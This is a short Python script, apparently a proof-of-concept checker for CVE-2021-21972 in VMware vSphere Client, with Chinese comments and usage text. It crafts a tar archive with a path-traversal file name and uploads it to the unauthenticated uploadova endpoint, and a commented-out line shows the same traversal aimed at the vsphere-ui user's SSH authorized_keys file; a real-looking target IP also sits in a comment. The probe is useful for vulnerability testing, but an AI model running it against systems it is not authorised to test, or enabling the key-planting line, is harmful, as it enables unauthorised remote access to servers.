import tarfile
import os
from io import BytesIO
import requests
import sys

def title():
    print('+------------------------------------------')
    print('+  Version: VMWare VSphere_Client                                    ')
    print('+  使用格式:  python3 CVE-2021-21972-vSphere_Client 192.168.1.234:443')
    print('+------------------------------------------')

def return_zip():
    with tarfile.open("test.tar", 'w') as tar:
        payload = BytesIO()
        id_rsa_pub = '1'
        #tarinfo = tarfile.TarInfo(name='../../../home/vsphere-ui/.ssh/authorized_keys')
        tarinfo = tarfile.TarInfo(name='../../../dev/null')
        f1 = BytesIO(id_rsa_pub.encode())
        tarinfo.size = len(f1.read())
        f1.seek(0)
        tar.addfile(tarinfo, fileobj=f1)
        tar.close()
        payload.seek(0)

def run(ip, port):
    files = {'uploadFile': open('test.tar', 'rb')}
    if port == 443:
        url = 'https://{}'.format(ip)
    else:
        url = 'https://{}:{}'.format(ip, port)
    url = url + '/ui/vropspluginui/rest/services/uploadova'
    print(url)
    print('vuln_url:{}'.format(target))

    try:
        requests.packages.urllib3.disable_warnings()
        r = requests.post(url=url, files=files, timeout=3, verify=False)
    except:
        print("[-] Target Not CVE-2021-21972 Vuln")
        return False
    else:
        if ("SUCCESS" in r.text or "success" in r.text) and r.status_code == 200:
            print("CVE-2021-21972 is exist")
            return True
        else:
            print("CVE-2021-21972 isn't exist")
            return False

if __name__ == "__main__":
    try:
        #打印
        title()
        return_zip()

        target = sys.argv[1]
        ip = target.split(':')[0]
        port = int(target.split(':')[1])
        #target="https://103.215.208.24/ui/vropspluginui/rest/services/uploadova"

        # 执行验证流程
        result = run(ip, port)

        # 打印验证结果
        if result:
            print('Exist')
        else:
            print('UnExist')
    except IOError as e:
        raise e
